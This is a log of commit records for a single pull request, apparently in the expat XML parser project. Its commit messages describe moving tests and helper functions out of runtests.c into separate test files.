628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move XML declaration tests to basic_tests.c,"{""sha"": ""f3a12e68ddcf7d0663918f76bf01a73b0a7e5222"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T13:09:05Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Separate out whitespace normalisation tests and helper functions,"{""sha"": ""12e905cf06940b53bcfab74fd6b7b4235684005f"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T13:05:39Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some more tests to basic_tests.c,"{""sha"": ""419f833ca4155bb21e710bce66cc586284392f13"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T12:59:02Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move a swathe of external entity tests out of runtests.c,"{""sha"": ""383e8bb3437440f0c0ee6bf90ff4b061edcb7f85"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:11:36Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move start and end event handlers to a new file,"{""sha"": ""4b13685a6aaaddb52d28802e70c0c44badc34f6c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T12:30:07Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move character and attribute data support functions to common.c,"{""sha"": ""6eeaf51dd0fbecd895bd8bd4eb6ec94dc06f774f"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T11:25:28Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move first tranche of character/encoding tests out of runtests.c,"{""sha"": ""0bb2528e0100ea9e04e3c4781f62a5a4fe176f83"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T10:32:15Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move creation of basic test case to a separate file.

Eventually this file will contain all the basic test cases, but
I am just starting with the test case creation.","{""sha"": ""d273f0092c35abbde5b58af47c9128c2737642f0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-29T11:00:56Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move external entity and parameter entity support to common.c

Specifically external_entity_optioner and param_entity_match_handler
which latter is used surprisingly little","{""sha"": ""abc874c49bb4f666939e4d576cdbcb98361f8f60"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-26T16:35:32Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move dummy handler functions to a new source file,"{""sha"": ""84a82b56d6967cff1dc364748fb5986af5eaa9c4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-25T16:32:16Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""9f17b3161eae3db169c62b3dba8fe4fa2b0f3477"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:47:11Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move row and column number tests to basic_tests.c,"{""sha"": ""bfab38bc3a4897d5e9db49d78117314cd42e7f62"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T12:04:29Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move basic NotStandalone tests out of runtests.c,"{""sha"": ""3643beaa55cdf0dd4c294ebe9e3c4fef686b8447"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:21:05Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move remaining encoding tests out of runtests.c,"{""sha"": ""294dd24fb81250d7b72dc47493e8c1153c98ed78"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T11:56:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move basic attribute list test out of runtests.c,"{""sha"": ""0e5270ae073cf1a71aafad5a3daa4bcd6fe5160b"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:30:46Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move out some more basic tests,"{""sha"": ""33a56d20e9401be21f07b7bab4fb01c4107f70de"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:25:25Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move external_entity_null_loader() to test/handlers,c","{""sha"": ""8b5800a5df469acf6de268bac8cef16f470f1876"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:18:53Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some foreign DTD tests out of runtests.c,"{""sha"": ""c9c8597fe0d1abffcfd5d37c85cc85dd2181cff4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:15:50Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move test_dtd_elements_nesting() out of runtests.c

Don't put element_decl_check_model in with the rest of the handlers
because it is strongly tied with this test and not likely to ever
be generally useful.","{""sha"": ""e2c2ae8fb47d854c19b5c8bcdda68dbe8fbbf54f"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:12:59Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move simple recording test handlers out of runtests.c,"{""sha"": ""9fb2feec241926eb292e8e7340c6a7ab47281101"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:04:59Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""54a2f258f2e6c616fc64f19e696cf0abd357873d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:56:51Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""b919a6b7de4805dae09a009c618056160ecffbeb"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:07:52Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some more basic tests out of runtests.c,"{""sha"": ""d43c3049fe6cef0da1cef67912b8ffe394ea9b0c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:26:59Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some more tests to basic_tests.c,"{""sha"": ""564981eed3080f235aa6f30b75f3e22f789e8af9"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:39:53Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move parser_stop_character_handler out of runtests.c

Also make ""resumable"" a global and rename it as g_resumable.  It
too should be getting passed through user data...","{""sha"": ""764a90c14f3f9c1a658fa837603eddedbcc282b9"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:20:29Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some more basic tests (stop/suspend in char data handler),"{""sha"": ""de2bec82923cdb6d7334f8f7286e9dc75fb29b14"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:05:11Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move clearing_aborting_character_handler out of runtests.c

Also make ""resumable"" a global and rename it as g_resumable.  This
really should be passed through user data somehow, but now is not
its moment to die.","{""sha"": ""3e8cb5bd57d679d88fedea450da64d2c7fae8f6e"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:01:30Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move constant test data to common.c,"{""sha"": ""354fa7772d4ed46e2ba22d90f949a8b4d4818ea0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:51:30Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more constant data out of runtests.c,"{""sha"": ""e1f48e36dceaa0a7ad461680208b61dbf6664e98"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T16:54:11Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move basic xmlns without namespaces tests out,"{""sha"": ""5491bd19116f2720989a7037fbbe6907d60d1cbe"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T14:40:01Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move basic failing-allocator entity tests from runtests.c,"{""sha"": ""e3e2edac1fef43e9044672145cc7b7402d1205d3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T15:00:22Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move allocation-faulting external entity handler from runtests.c,"{""sha"": ""b9ff104a9ca37f6303e77dcb37b57d48ff482fd9"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T14:58:31Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,"Move remaining declaration, comment and PI tests to alloc_tests.c","{""sha"": ""bf80d79c480fc20bddb615969000559233946ff6"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T14:55:41Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move first allocation test out of tests/runtests.c,"{""sha"": ""28571278909add53fb3e30fe2440dcba0db21edd"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T13:45:59Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Fix version number in test_misc_version (?),"{""sha"": ""25ff0b69f33a792aaeb03537f92c43ca8cda2987"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T16:18:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move allocation setup/teardown functions into tests/common.c,"{""sha"": ""350348e260140c4c1c13771277bf65656e58c848"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T13:23:50Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move test_alloc_dtd_copy_default_atts() out of runtests.c,"{""sha"": ""d09e842dd9076c35b900c6b137a3d65a1fd735d5"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T15:58:16Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move some more misc tests over to misc_tests.c,"{""sha"": ""3d5965ca0c708a7b3c4df855312ec7c94743a630"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T16:57:34Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move allocation tests framework out to new alloc_tests.[ch] files,"{""sha"": ""90841c7493f1655acf17df697c5d4f4988aaa521"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T13:44:15Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,"Move remaining misc tests out of runtests.c

It is exceedingly unclear why these tests are in the misc section
at all, and allocating memory rather than just using the stack
(and not checking the return values from XML_ParserCreate() or
malloc() either).  At some point they need revisiting with an
axe and a lot of comments.","{""sha"": ""85a87fa2291a9e1f4eacb5cd45038a62b4aa6d39"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T17:10:56Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move first tranche of nsalloc tests to tests/nsalloc_tests.c,"{""sha"": ""2af12c5b5d1e25b093ac20481ffa254c06b32527"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T10:46:24Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move a bunch more allocation checks out of runtests.c,"{""sha"": ""9e6d1a2b49e249ee4dfe43e08dfbc220dcdfda1e"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T16:17:55Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move more alloc tests out of runtests.c,"{""sha"": ""5e3c2fe21984dcf288ec24c2d6dddd02b055f0a7"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T16:23:47Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move remaining allocation tests from runtests.c to alloc_tests.c,"{""sha"": ""665d3ae065171da84c6946539ea9239465dc9df0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T16:40:08Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Fix formatting issues,"{""sha"": ""35ca5614ada63b4300e186c7b8d6a06073f82453"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T16:40:36Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Add superstructure for moving ns allocation tests out of runtests.c,"{""sha"": ""e34cc1c613621f884f0b1a50374a5beb712b76f3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T10:43:57Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move remaining nsalloc tests out of runtests.c,"{""sha"": ""e1c35c24c350e0b7b4aaff540bbde805bf670136"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T10:50:01Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Create superstructure for accounting test cases,"{""sha"": ""0fab0da937db4657cd2de9c72369ddf9ae0770e5"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T15:41:17Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move accounting tests from runtests.c to acc_tests.c,"{""sha"": ""d86a2be7ce1b62add2d6c459570ef3656efc7628"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T15:58:48Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Formatting fixes,"{""sha"": ""f144802975de20601648aa72472aabcbfebee31d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T16:17:24Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,"Silence ""not a prototype"" warnings on portableNAN/portableINFINITY","{""sha"": ""ffa3ddb49c63309514c7feba20d67f30a8669ad4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-09T15:59:32Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move test_alloc_external_entity() out of runtests.c,"{""sha"": ""ecc923d04383958c472c1b61ad59e3536fb1058e"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-08T16:01:39Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move version test to misc_tests.c,"{""sha"": ""23d5afee0707cd957a6f87e7d7dba22587082f6d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T14:36:55Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move unknown encoding tests out of runtests.c,"{""sha"": ""4d0edcd8b8cda224c7bf161b6687e7c41bc841af"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T14:50:46Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Set up to move misc tests from tests/runtests.c,"{""sha"": ""d0eef2c42826e92e8d33f936763f942ec76cc253"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T13:50:08Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,"Remove redundant aborting_xdecl_handler() from runtests.c

We can use entity_suspending_xdecl_handler() instead, passing the
global parser as user data, and avoid needless repetition.","{""sha"": ""1f2d96799f0ab2df3fe4d7da1bd8e664961b46a8"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T11:01:43Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move test_suspend_xdecl() out of runtests.c,"{""sha"": ""83950367ecffcdb435de0e0c31ec6714358923c0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T11:04:27Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move (some) epilog tests out of runtests.c,"{""sha"": ""58ee7868d94639700b78f08d64627f0773d50dec"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T11:11:29Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move remaining basic epilog tests out of runtests.c,"{""sha"": ""55e64115337d3297673d4ca59986b2dd7196a158"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T13:38:15Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move some entity suspension tests out of runtests.c,"{""sha"": ""4868656cc8e54cb9ed5484d7715445ccc2550c68"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T13:46:01Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move another collection of tests out of runtests.c,"{""sha"": ""ef9e67c43b29fa442430d304ccb403397f313f10"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T13:53:57Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move another tranche of basic tests out of runtests.c,"{""sha"": ""b02e19285922f5eb90bc6a749c3be811a37301fe"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T14:14:37Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move the first tranche of misc tests into misc_tests.c,"{""sha"": ""09625abaac04f65a18c8c7fa5042216c4a0054dc"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-05T13:52:04Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
628,SubmitCommit,2022-08-15 12:34:45,RMJ10,fork_close,Move some UTF16 comment tests out of runtests.c,"{""sha"": ""d39ce3ea7f8791199d9a37e1da5aedd8baf28ec2"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T14:29:47Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:45Z""}}"
